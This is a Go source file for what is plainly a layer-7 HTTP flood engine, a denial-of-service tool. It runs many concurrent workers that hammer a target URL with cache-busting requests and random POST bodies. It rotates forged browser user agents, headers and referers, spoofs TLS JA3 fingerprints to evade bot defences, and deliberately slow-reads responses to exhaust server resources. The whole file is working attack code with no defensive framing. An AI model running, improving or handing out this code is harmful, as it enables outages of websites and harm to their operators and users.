package l7

import (
	"bytes"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/http/cookiejar"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	utls "github.com/refraction-networking/utls"
	"golang.org/x/net/http2"
)

type UASet struct {
	UA       string
	SecCHUA  string
	Platform string
	Mobile   bool
	Browser  string 
}

var uaPool = []UASet{
	{UA: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", SecCHUA: `"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"`, Platform: `"Windows"`, Browser: "chrome"},
	{UA: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36", SecCHUA: `"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"`, Platform: `"Windows"`, Browser: "chrome"},
	{UA: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", SecCHUA: `"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"`, Platform: `"macOS"`, Browser: "chrome"},
	{UA: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", SecCHUA: `"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"`, Platform: `"Linux"`, Browser: "chrome"},
	{UA: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0", Browser: "firefox"},
	{UA: "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0", Browser: "firefox"},
	{UA: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15", Browser: "safari"},
	{UA: "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1", Mobile: true, Browser: "safari"},
	{UA: "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36", SecCHUA: `"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"`, Platform: `"Android"`, Mobile: true, Browser: "chrome"},
	{UA: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0", SecCHUA: `"Microsoft Edge";v="120", "Chromium";v="120", "Not_A Brand";v="8"`, Platform: `"Windows"`, Browser: "edge"},
}

var refererPool = []string{
	"https://www.google.com/",
	"https://www.bing.com/",
	"https://duckduckgo.com/",
	"https://twitter.com/",
	"https://www.facebook.com/",
	"https://www.reddit.com/",
	"",
}

const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

func randStr(n int) string {
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func randUA() UASet {
	return uaPool[rand.Intn(len(uaPool))]
}

func uniqueURL(base string) string {
	switch rand.Intn(8) {
	case 0:
		return base + "?v=" + randStr(6)
	case 1:
		return base + "?_=" + randStr(8)
	case 2:
		return base + "/" + randStr(6)
	case 3:
		return base + "?q=" + randStr(4) + "&t=" + randStr(4)
	case 4:
		return base + "?utm_source=" + randStr(5) + "&utm_medium=" + randStr(5)
	case 5:
		return base + "?id=" + randStr(6) + "&page=" + randStr(1)
	case 6:
		return base + "/" + randStr(3) + "/" + randStr(3)
	default:
		return base + "?cachebust=" + randStr(10)
	}
}

func applyBrowserHeaders(req *http.Request, ua UASet, referer string) {
	h := req.Header
	h.Set("User-Agent", ua.UA)
	h.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8")
	h.Set("Accept-Language", "en-US,en;q=0.9")
	h.Set("Accept-Encoding", "gzip, deflate, br")
	h.Set("Sec-Fetch-Dest", "document")
	h.Set("Sec-Fetch-Mode", "navigate")
	h.Set("Sec-Fetch-Site", "none")
	h.Set("Sec-Fetch-User", "?1")
	h.Set("Upgrade-Insecure-Requests", "1")
	h.Set("Cache-Control", "no-cache, no-store, max-age=0")
	h.Set("Pragma", "no-cache")
	h.Set("DNT", "1")
	h.Set("Connection", "keep-alive")
	if referer != "" {
		h.Set("Referer", referer)
	}
	if ua.SecCHUA != "" {
		h.Set("sec-ch-ua", ua.SecCHUA)
		if ua.Mobile {
			h.Set("sec-ch-ua-mobile", "?1")
		} else {
			h.Set("sec-ch-ua-mobile", "?0")
		}
		h.Set("sec-ch-ua-platform", ua.Platform)
		h.Set("sec-ch-ua-arch", `"x86"`)
		h.Set("sec-ch-ua-bitness", `"64"`)
		h.Set("sec-ch-ua-full-version-list", ua.SecCHUA)
	}
}

func randomBody() io.Reader {
	n := 64 + rand.Intn(448) // 64..512 byte
	return bytes.NewReader([]byte(randStr(n)))
}

type FloodEngine struct {
	Target   string
	Threads  int
	Hostname string
	JA3Spoof bool
	HTTP2    bool
	SlowRate int

	Succ  uint64
	Fail  uint64
	Conns int64

	errLogged uint64
}

func NewFloodEngine(target string, threads int, hostname string, ja3, h2 bool) *FloodEngine {
	return &FloodEngine{
		Target:   target,
		Threads:  threads,
		Hostname: hostname,
		JA3Spoof: ja3,
		HTTP2:    h2,
		SlowRate: 20,
	}
}

func (f *FloodEngine) Run(ctx context.Context, stop <-chan struct{}) {
	var wg sync.WaitGroup
	for i := 0; i < f.Threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			f.worker(ctx, stop)
		}()
	}
	wg.Wait()
}

func (f *FloodEngine) logErr(prefix string, err error) {
	n := atomic.AddUint64(&f.errLogged, 1)
	if n <= 5 || n%5000 == 0 {
		fmt.Printf("[L7-DEBUG] %s: %v (lần %d)\n", prefix, err, n)
	}
}

// pickHello: random fingerprint JA3 giữa các browser
func pickHello(browser string) utls.ClientHelloID {
	switch browser {
	case "firefox":
		return utls.HelloFirefox_Auto
	case "safari", "edge":
		return utls.HelloSafari_Auto
	default:
		return utls.HelloChrome_Auto
	}
}

func (f *FloodEngine) worker(ctx context.Context, stop <-chan struct{}) {
	jar, _ := cookiejar.New(nil)

	dialer := &net.Dialer{
		Timeout:   5 * time.Second,
		KeepAlive: 15 * time.Second,
	}

	pinnedUA := randUA()
	helloID := pickHello(pinnedUA.Browser)

	dialTLS := func(ctx context.Context, network, addr string) (net.Conn, error) {
		raw, err := dialer.DialContext(ctx, network, addr)
		if err != nil {
			return nil, err
		}
		ucfg := &utls.Config{
			ServerName:         f.Hostname,
			InsecureSkipVerify: true,
			NextProtos:         []string{"h2", "http/1.1"},
		}
		uconn := utls.UClient(raw, ucfg, helloID)
		if err := uconn.HandshakeContext(ctx); err != nil {
			raw.Close()
			return nil, err
		}
		return uconn, nil
	}

	var rt http.RoundTripper

	if f.HTTP2 {
		h2t := &http2.Transport{
			DialTLSContext: func(ctx context.Context, network, addr string, cfg *tls.Config) (net.Conn, error) {
				return dialTLS(ctx, network, addr)
			},
			AllowHTTP:          false,
			DisableCompression: true,
			ReadIdleTimeout:    10 * time.Second,
			PingTimeout:        10 * time.Second,
			MaxHeaderListSize: 1 << 20,
		}
		rt = h2t
	} else {
		tr := &http.Transport{
			MaxIdleConns:          0,
			MaxIdleConnsPerHost:   0,
			IdleConnTimeout:       2 * time.Second,
			DisableKeepAlives:     true,
			DisableCompression:    true,
			ForceAttemptHTTP2:     false,
			TLSHandshakeTimeout:   5 * time.Second,
			ResponseHeaderTimeout: 8 * time.Second,
			ExpectContinueTimeout: 1 * time.Second,
		}
		if f.JA3Spoof {
			tr.DialTLSContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
				return dialTLS(ctx, network, addr)
			}
		} else {
			tr.TLSClientConfig = &tls.Config{
				ServerName:         f.Hostname,
				InsecureSkipVerify: true,
				NextProtos:         []string{"http/1.1"},
			}
		}
		rt = tr
	}

	client := &http.Client{
		Transport: rt,
		Jar:       jar,
		Timeout:   10 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return nil
		},
	}

	var consecutiveFail int

	for {
		select {
		case <-ctx.Done():
			return
		case <-stop:
			return
		default:
		}

		url := uniqueURL(f.Target)
		method := "GET"
		var body io.Reader
		if rand.Intn(5) == 0 {
			method = "POST"
			body = randomBody()
		}

		req, err := http.NewRequestWithContext(ctx, method, url, body)
		if err != nil {
			atomic.AddUint64(&f.Fail, 1)
			continue
		}

		ua := pinnedUA
		if rand.Intn(10) < 3 {
			ua = randUA()
		}
		ref := refererPool[rand.Intn(len(refererPool))]
		applyBrowserHeaders(req, ua, ref)

		if method == "POST" {
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		}

		atomic.AddInt64(&f.Conns, 1)
		resp, err := client.Do(req)
		if err != nil {
			atomic.AddUint64(&f.Fail, 1)
			atomic.AddInt64(&f.Conns, -1)
			f.logErr("do", err)

			consecutiveFail++
			backoff := consecutiveFail * 10
			if backoff > 500 {
				backoff = 500
			}
			time.Sleep(time.Duration(backoff) * time.Millisecond)
			continue
		}

		consecutiveFail = 0
		atomic.AddUint64(&f.Succ, 1)

		if rand.Intn(100) < f.SlowRate {
			slowReadBody(resp, 10+rand.Intn(40), 3+rand.Intn(5))
		} else {
			io.Copy(io.Discard, io.LimitReader(resp.Body, 1<<20))
			resp.Body.Close()
		}
		atomic.AddInt64(&f.Conns, -1)

		if strings.Contains(url, "cachebust") {
			time.Sleep(time.Duration(5+rand.Intn(30)) * time.Millisecond)
		} else {
			time.Sleep(time.Duration(rand.Intn(25)) * time.Millisecond)
		}
	}
}

func (f *FloodEngine) Snapshot() (uint64, uint64, int64) {
	return atomic.LoadUint64(&f.Succ),
		atomic.LoadUint64(&f.Fail),
		atomic.LoadInt64(&f.Conns)
}